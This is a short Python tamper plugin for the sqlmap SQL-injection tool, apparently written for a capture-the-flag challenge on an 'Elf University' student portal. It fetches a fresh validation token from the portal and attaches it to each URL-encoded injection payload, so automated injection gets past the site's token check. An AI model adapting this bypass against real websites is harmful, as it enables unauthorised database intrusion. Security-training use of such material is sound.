#!/usr/bin/env python

from lib.core.enums import PRIORITY

import requests
import urllib.parse

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def myvalidator():
    r = requests.get("https://studentportal.elfu.org/validator.php")
    return r.content.decode()

def tamper(payload, **kwargs):
    payload = urllib.parse.quote(payload) + '&token=' + urllib.parse.quote(myvalidator())
    return payload
